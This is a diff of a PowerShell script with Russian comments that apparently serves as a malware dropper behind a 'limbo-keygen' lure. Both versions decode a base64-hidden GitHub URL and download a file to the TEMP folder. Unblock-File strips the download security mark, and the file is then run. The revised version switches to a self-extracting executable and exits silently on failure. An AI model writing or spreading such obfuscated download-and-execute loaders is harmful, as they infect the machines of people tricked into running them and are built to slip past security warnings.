@@ -1,21 +1,14 @@
-$base64Url = "aHR0cHM6Ly9naXRodWIuY29tL3dkYXNkYXNkd2FkYXcvbC9yYXcvcmVmcy9oZWFkcy9tYWluL2xpbWJvLWtleWdlbi56aXA="
+$base64Url = "aHR0cHM6Ly9naXRodWIuY29tL3dkYXNkYXNkd2FkYXcvbC9yYXcvcmVmcy9oZWFkcy9tYWluL2xpbWJvLWtleWdlbi5zZnguZXhl"
 $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64Url))
-$zipPath = "$env:TEMP\limbo-keygen.zip"
-$extractPath = "$env:TEMP\LimboExtracted"
+$exePath = "$env:TEMP\limbo-keygen.sfx.exe"
 
-# 1. Скачиваем ZIP-архив
-(New-Object System.Net.WebClient).DownloadFile($url, $zipPath)
-Unblock-File $zipPath
-
-# 2. Распаковываем архив
-if (Test-Path $extractPath) { Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue }
-Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
-
-# 3. Ищем и запускаем limbo-keygen.exe
-$exePath = Get-ChildItem -Path $extractPath -Filter "limbo-keygen.exe" -Recurse | Select-Object -First 1 -ExpandProperty FullName
-if ($exePath) {
-    Start-Process -FilePath $exePath
-} else {
-    # Если файл не найден, выводим ошибку (или просто закрываемся)
-    Write-Host "File not found"
+# 1. Скачиваем
+try {
+    (New-Object System.Net.WebClient).DownloadFile($url, $exePath)
+    Unblock-File $exePath
+} catch {
+    exit
 }
+
+# 2. Запускаем SFX архив
+Start-Process -FilePath $exePath
